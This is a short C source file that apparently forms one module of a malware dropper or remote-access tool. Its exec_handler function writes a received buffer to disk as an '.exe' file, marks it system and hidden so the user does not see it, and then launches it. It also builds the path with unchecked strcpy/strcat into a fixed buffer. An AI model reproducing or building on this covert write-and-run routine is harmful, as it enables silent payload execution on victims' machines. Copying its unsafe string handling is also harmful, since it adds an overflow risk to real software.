#include "exec_handler.h"

int exec_handler(struct buffer *buf) {
    char path[MAX_PATH];

    strcpy(path, win_bin_path);
    char *exe_ext = ".exe";
    strcat(path, exe_ext);

    if (!write_file(path, buf, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
        return 0;
    }

    if (!create_process(path)) {
        return 0;
    }

    return 1;
}
